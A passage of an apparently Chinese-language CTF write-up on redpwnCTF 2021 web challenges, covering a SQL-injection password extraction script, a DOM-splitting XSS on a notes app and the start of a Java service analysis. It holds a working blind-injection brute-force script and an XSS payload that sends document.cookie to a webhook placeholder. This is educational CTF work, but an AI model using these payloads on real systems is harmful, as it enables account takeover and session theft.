&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210713164749339.png" alt="image-20210713164749339">&lt;/p>
&lt;p>————其实还是有一点点疑问，为什么&lt;code>select substr(password,n,1) from users&lt;/code>就能确保是ginoid的passwd呢？ginkoid是表中的第一条数据，在新建表后立刻插入，这就可以保证在查询的时候只查ginkoid的密码吗？&lt;/p>
&lt;p>discord之前有人问过这个问题，当时的解答是这是sqllite的特性，但是用sqllite在线工具尝试后发现也不是这样的 也会返回所有数据的&lt;code>substr(x,x,x)&lt;/code>的值，但是确实是用这样的payload能做出来&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210713164423092.png" alt="image-20210713164423092">&lt;/p>
&lt;p>————后来想了一下 是这里的&lt;code>return correct_password[0][0]==password&lt;/code> 确保了虽然sql查询语句返回的是很多个单一字母，但是是多行返回，仍然只会取到第一个；再加上username是主键 第一个插入，所以这个payload是可以的&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210716173434141.png" alt="image-20210716173434141">&lt;/p>
&lt;p>以一个事后诸葛亮的角度来看&lt;code>return correct_password[0][0]==password&lt;/code> 这句代码 其实有暗示的成分在了&lt;/p>
&lt;p>————还有另一版的脚本 discord里收的&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210716175415526.png" alt="image-20210716175415526.png">&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">asyncio&lt;/span>
&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">random&lt;/span>
&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">aiohttp&lt;/span>
&lt;span style="color:#111">allowed&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#39;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ123456789&amp;#39;&lt;/span>
&lt;span style="color:#111">url&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#39;&amp;lt;https://cool.mc.ax/&amp;gt;&amp;#39;&lt;/span>
&lt;span style="color:#111">n&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">32&lt;/span>
&lt;span style="color:#111">final&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">dict&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;span style="color:#00a8c8">async&lt;/span> &lt;span style="color:#00a8c8">def&lt;/span> &lt;span style="color:#75af00">try_pass&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">sem&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">username&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">password&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">index&lt;/span>&lt;span style="color:#111">):&lt;/span>
&lt;span style="color:#111">params&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#d88200">&amp;#39;username&amp;#39;&lt;/span>&lt;span style="color:#111">:&lt;/span> &lt;span style="color:#111">username&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;span style="color:#d88200">&amp;#39;password&amp;#39;&lt;/span>&lt;span style="color:#111">:&lt;/span> &lt;span style="color:#111">password&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#00a8c8">async&lt;/span> &lt;span style="color:#00a8c8">with&lt;/span> &lt;span style="color:#111">sem&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#00a8c8">async&lt;/span> &lt;span style="color:#00a8c8">with&lt;/span> &lt;span style="color:#111">aiohttp&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">ClientSession&lt;/span>&lt;span style="color:#111">()&lt;/span> &lt;span style="color:#00a8c8">as&lt;/span> &lt;span style="color:#111">session&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#00a8c8">async&lt;/span> &lt;span style="color:#00a8c8">with&lt;/span> &lt;span style="color:#111">session&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">post&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">url&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">data&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">params&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#00a8c8">as&lt;/span> &lt;span style="color:#111">resp&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#111">result&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">await&lt;/span> &lt;span style="color:#111">resp&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">text&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#d88200">&amp;#39;Incorrect&amp;#39;&lt;/span> &lt;span style="color:#f92672">not&lt;/span> &lt;span style="color:#f92672">in&lt;/span> &lt;span style="color:#111">result&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#111">print&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">f&lt;/span>&lt;span style="color:#d88200">&amp;#39;password[&lt;/span>&lt;span style="color:#d88200">{&lt;/span>&lt;span style="color:#111">index&lt;/span>&lt;span style="color:#d88200">}&lt;/span>&lt;span style="color:#d88200">]: &lt;/span>&lt;span style="color:#d88200">{&lt;/span>&lt;span style="color:#111">password&lt;/span>&lt;span style="color:#d88200">}&lt;/span>&lt;span style="color:#d88200">&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">final&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#111">index&lt;/span>&lt;span style="color:#111">]&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">password&lt;/span>
&lt;span style="color:#00a8c8">async&lt;/span> &lt;span style="color:#00a8c8">def&lt;/span> &lt;span style="color:#75af00">get_char&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">sem&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">index&lt;/span>&lt;span style="color:#111">):&lt;/span>
&lt;span style="color:#75715e"># random username since otherwise we error&lt;/span>
&lt;span style="color:#111">username&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#39;&amp;#39;&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">join&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">random&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">choices&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">allowed&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">k&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#ae81ff">32&lt;/span>&lt;span style="color:#111">))&lt;/span>
&lt;span style="color:#111">payload&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">f&lt;/span>&lt;span style="color:#d88200">&amp;#34;&amp;#39;||(SELECT substr(password,&lt;/span>&lt;span style="color:#d88200">{&lt;/span>&lt;span style="color:#111">index&lt;/span>&lt;span style="color:#f92672">+&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#d88200">}&lt;/span>&lt;span style="color:#d88200">,1) FROM users)||&amp;#39;&amp;#34;&lt;/span>
&lt;span style="color:#00a8c8">assert&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">len&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">payload&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#f92672">&amp;lt;=&lt;/span> &lt;span style="color:#ae81ff">50&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">params&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#d88200">&amp;#39;username&amp;#39;&lt;/span>&lt;span style="color:#111">:&lt;/span> &lt;span style="color:#111">username&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;span style="color:#d88200">&amp;#39;password&amp;#39;&lt;/span>&lt;span style="color:#111">:&lt;/span> &lt;span style="color:#111">payload&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#00a8c8">async&lt;/span> &lt;span style="color:#00a8c8">with&lt;/span> &lt;span style="color:#111">sem&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#00a8c8">async&lt;/span> &lt;span style="color:#00a8c8">with&lt;/span> &lt;span style="color:#111">aiohttp&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">ClientSession&lt;/span>&lt;span style="color:#111">()&lt;/span> &lt;span style="color:#00a8c8">as&lt;/span> &lt;span style="color:#111">session&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#00a8c8">await&lt;/span> &lt;span style="color:#111">session&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">post&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">url&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#d88200">&amp;#39;register&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">data&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">params&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">tasks&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">[]&lt;/span>
&lt;span style="color:#00a8c8">for&lt;/span> &lt;span style="color:#111">c&lt;/span> &lt;span style="color:#f92672">in&lt;/span> &lt;span style="color:#111">allowed&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#111">tasks&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">append&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">try_pass&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">sem&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">username&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">c&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">index&lt;/span>&lt;span style="color:#111">))&lt;/span>
&lt;span style="color:#00a8c8">await&lt;/span> &lt;span style="color:#111">asyncio&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">gather&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#f92672">*&lt;/span>&lt;span style="color:#111">tasks&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#00a8c8">async&lt;/span> &lt;span style="color:#00a8c8">def&lt;/span> &lt;span style="color:#75af00">main&lt;/span>&lt;span style="color:#111">():&lt;/span>
&lt;span style="color:#75715e"># without this we get an OSError due to too many open file descriptors&lt;/span>
&lt;span style="color:#111">sem&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">asyncio&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">Semaphore&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">300&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">index_tasks&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">[]&lt;/span>
&lt;span style="color:#00a8c8">for&lt;/span> &lt;span style="color:#111">i&lt;/span> &lt;span style="color:#f92672">in&lt;/span> &lt;span style="color:#111">range&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">n&lt;/span>&lt;span style="color:#111">):&lt;/span>
&lt;span style="color:#111">index_tasks&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">append&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">get_char&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">sem&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">i&lt;/span>&lt;span style="color:#111">))&lt;/span>
&lt;span style="color:#00a8c8">await&lt;/span> &lt;span style="color:#111">asyncio&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">gather&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#f92672">*&lt;/span>&lt;span style="color:#111">index_tasks&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">password&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#39;&amp;#39;&lt;/span>
&lt;span style="color:#00a8c8">for&lt;/span> &lt;span style="color:#111">i&lt;/span> &lt;span style="color:#f92672">in&lt;/span> &lt;span style="color:#111">range&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">len&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">final&lt;/span>&lt;span style="color:#111">)):&lt;/span>
&lt;span style="color:#111">password&lt;/span> &lt;span style="color:#f92672">+=&lt;/span> &lt;span style="color:#111">final&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#111">i&lt;/span>&lt;span style="color:#111">]&lt;/span>
&lt;span style="color:#111">print&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">f&lt;/span>&lt;span style="color:#d88200">&amp;#34;Password: &lt;/span>&lt;span style="color:#d88200">{&lt;/span>&lt;span style="color:#111">password&lt;/span>&lt;span style="color:#d88200">}&lt;/span>&lt;span style="color:#d88200">&amp;#34;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">asyncio&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">run&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">main&lt;/span>&lt;span style="color:#111">())&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="webnotes">web/notes&lt;/h2>
&lt;blockquote>
&lt;p>Texting things to yourself, but online! &lt;a href="https://notes.mc.ax/">notes.mc.ax&lt;/a>&lt;/p>
&lt;p>&lt;em>Please put a reasonably secure password when making an account&lt;/em>&lt;/p>
&lt;p>Report problems &lt;a href="https://admin-bot.mc.ax/notes">here&lt;/a>.&lt;/p>
&lt;p>Downloads - &lt;a href="https://static.redpwn.net/uploads/b84015269379e24fc336a02b23656a1428e8bea965667738ede86e3c8e611ca1/notes.tar.gz">notes.tar.gz&lt;/a>&lt;/p>
&lt;/blockquote>
&lt;p>先看页面 是个登录框，先填用户名和密码再点login或register，尝试test: test登入，界面是一个可以加notes 自定body和tag的app&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210710144224462.png" alt="image-20210710144224462">&lt;/p>
&lt;p>在view notes看到已经有人试过xss了，这里有个小小的越权漏洞，/view/+username直接可以看到其他的师傅在尝试什么样的payload（看了wp以后才意识到这里的tag部分就是注入点 而当时的我以为是卡bug了&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210710195356571.png" alt="image-20210710195356571">&lt;/p>
&lt;p>简单审了下源码，也没啥特别的，首先初始化一个admin号，flag在admin的private分类的notes中；对于个人发的notes会转义body部分为html实体来预防xss&lt;/p>
&lt;p>但是这个notes-app的形式是妥妥的xss了，那突破口在哪里捏？其实是被忽略的tag部分！一般情况下看到tag可选private/public就会不关注这里，但是配合特殊的DOM解析 这里无疑是注入点！下面简单分析一下，&lt;a href="https://cor.team/posts/redpwnCTF%202021%20-%20web%20challenges#notes">参考wp&lt;/a>&lt;/p>
&lt;p>从/static/view.html中我们可以看到这个notes-app的前端渲染所凭借的模板长啥样&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210806093357548.png" alt="image-20210806093357548">&lt;/p>
&lt;p>body部分被完全的保护了，但是tag没有过滤 只是限制了个数&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210806093711969.png" alt="image-20210806093711969">&lt;/p>
&lt;p>我们利用的就是浏览器解析html的部分，可以让不相关的几个notes拼接在一起（举个简单的栗子：在一个note里面用&lt;code>&amp;lt;p&amp;gt;&lt;/code> 另一个里面放&lt;code>&amp;lt;/p&amp;gt;&lt;/code>，中间的部分会被放在一起）这里选用的是&lt;code>&amp;lt;style&amp;gt;&lt;/code>这个tag，利用它onload的属性&lt;/p>
&lt;p>还有一个待解决的问题是上下两个notes之间会有&lt;code>&amp;lt;div class=&amp;quot;card&amp;quot;&amp;gt;&lt;/code>的存在；这也是不用&lt;code>&amp;lt;iframe&amp;gt;&lt;/code>和它的onload属性的原因，因为浏览器是不允许&lt;code>&amp;lt;iframe&amp;gt;&lt;/code>中属性换行的&lt;/p>
&lt;p>我们最终的payload&lt;/p>
&lt;pre tabindex="0">&lt;code>body: anything
tag: &amp;lt;style a='
body: anything
tag: 'onload='`
body: `;eval(somecode)/*
tag: */'&amp;gt;
&lt;/code>&lt;/pre>&lt;p>然后是常规的xss&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-html" data-lang="html">&lt;span style="color:#75715e">&amp;lt;!DOCTYPE html&amp;gt;&lt;/span>
&lt;span style="color:#111">&amp;lt;&lt;/span>&lt;span style="color:#f92672">html&lt;/span>&lt;span style="color:#111">&amp;gt;&lt;/span>
&lt;span style="color:#111">&amp;lt;&lt;/span>&lt;span style="color:#f92672">body&lt;/span>&lt;span style="color:#111">&amp;gt;&lt;/span>
&lt;span style="color:#111">&amp;lt;&lt;/span>&lt;span style="color:#f92672">script&lt;/span>&lt;span style="color:#111">&amp;gt;&lt;/span>
&lt;span style="color:#111">window&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">open&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;https://notes.mc.ax/view/&amp;lt;username&amp;gt;&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;navigator.sendBeacon(&amp;#39;&amp;lt;webhook server&amp;gt;&amp;#39;, document.cookie)&amp;#34;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#111">&amp;lt;/&lt;/span>&lt;span style="color:#f92672">script&lt;/span>&lt;span style="color:#111">&amp;gt;&lt;/span>
&lt;span style="color:#111">&amp;lt;/&lt;/span>&lt;span style="color:#f92672">body&lt;/span>&lt;span style="color:#111">&amp;gt;&lt;/span>
&lt;span style="color:#111">&amp;lt;/&lt;/span>&lt;span style="color:#f92672">html&lt;/span>&lt;span style="color:#111">&amp;gt;&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="webrequester">web/Requester&lt;/h2>
&lt;blockquote>
&lt;p>Java is the future. Strictly typed, extremeley secure, and the most modern frameworks all come together to make an unhackable service. - Nobody 2021&lt;/p>
&lt;p>&lt;a href="https://requester.mc.ax/">requester.mc.ax&lt;/a>&lt;/p>
&lt;p>Downloads - &lt;a href="https://static.redpwn.net/uploads/d92499fb296055bd3767e8d5c707605ca56a00517726fa281fa35dfda611fdee/requester-release.zip">requester-release.zip&lt;/a>&lt;/p>
&lt;/blockquote>
&lt;p>java可以说是完全不懂，比赛的时候就简单看了下就溜了，参考 &lt;a href="https://fireshellsecurity.team/redpwnctf-requester-and-requester-strikes-back/">解法1 - _replicator&lt;/a> &lt;a href="https://cor.team/posts/redpwnCTF%202021%20-%20web%20challenges#requester">解法2 - _find&lt;/a>&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210806100214553.png" alt="image-20210806100214553">&lt;/p>
&lt;p>一个简单的java-app，检测给出的api是否正常 并且返回一个json&lt;/p>
&lt;p>给了docker&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210710160029981.png" alt="image-20210710160029981">&lt;/p>
&lt;p>先用jd-gui打开jar包看看源码&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210716211333162.png" alt="image-20210716211333162">&lt;/p>
&lt;p>先看Main.class&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-java" data-lang="java">&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">Main&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">static&lt;/span> &lt;span style="color:#111">Database&lt;/span> &lt;span style="color:#111">db&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">static&lt;/span> &lt;span style="color:#111">String&lt;/span> &lt;span style="color:#111">flag&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">static&lt;/span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">main&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#111">args&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;span style="color:#111">String&lt;/span> &lt;span style="color:#111">adminUser&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">System&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getenv&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;adminUser&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;span style="color:#111">String&lt;/span> &lt;span style="color:#111">adminPassword&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">System&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getenv&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;adminPassword&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;span style="color:#111">flag&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">System&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getenv&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;flag&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;span style="color:#111">String&lt;/span> &lt;span style="color:#111">javalinEnv&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">System&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getenv&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;javalinEnv&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;span style="color:#111">db&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">Database&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">adminUser&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">adminPassword&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;span style="color:#111">db&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">initializeDatabase&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;span style="color:#111">JavalinJte&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">configure&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">createTemplateEngine&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">javalinEnv&lt;/span>&lt;span style="color:#f92672">));&lt;/span>
&lt;span style="color:#111">Javalin&lt;/span> &lt;span style="color:#111">app&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">Javalin&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">create&lt;/span>&lt;span style="color:#f92672">().&lt;/span>&lt;span style="color:#75af00">start&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">8080&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;span style="color:#111">app&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">get&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;/&amp;#34;&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">ctx&lt;/span> &lt;span style="color:#f92672">-&amp;gt;&lt;/span> &lt;span style="color:#111">ctx&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">render&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;index.jte&amp;#34;&lt;/span>&lt;span style="color:#f92672">));&lt;/span>
&lt;span style="color:#111">app&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">get&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;/createUser&amp;#34;&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">Handlers&lt;/span>&lt;span style="color:#f92672">::&lt;/span>&lt;span style="color:#111">createUser&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;span style="color:#111">app&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">get&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;/testAPI&amp;#34;&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">Handlers&lt;/span>&lt;span style="color:#f92672">::&lt;/span>&lt;span style="color:#111">testAPI&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>做一些初始化的工作，取出admin的用户名和密码以及flag的值，新建一个database，分出3个路由；&lt;/p>
&lt;p>先看database.class（分析的比较详细 之前做java很少&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-java" data-lang="java">&lt;span style="color:#00a8c8">private&lt;/span> &lt;span style="color:#00a8c8">final&lt;/span> &lt;span style="color:#111">String&lt;/span> &lt;span style="color:#111">adminUsername&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;span style="color:#00a8c8">private&lt;/span> &lt;span style="color:#00a8c8">final&lt;/span> &lt;span style="color:#111">String&lt;/span> &lt;span style="color:#111">adminPassword&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#75af00">Database&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">String&lt;/span> &lt;span style="color:#111">adminUsername&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">String&lt;/span> &lt;span style="color:#111">adminPassword&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;span style="color:#00a8c8">this&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">adminUsername&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">adminUsername&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;span style="color:#00a8c8">this&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">adminPassword&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">adminPassword&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;span style="color:#00a8c8">private&lt;/span> &lt;span style="color:#111">String&lt;/span> &lt;span style="color:#75af00">getDbString&lt;/span>&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
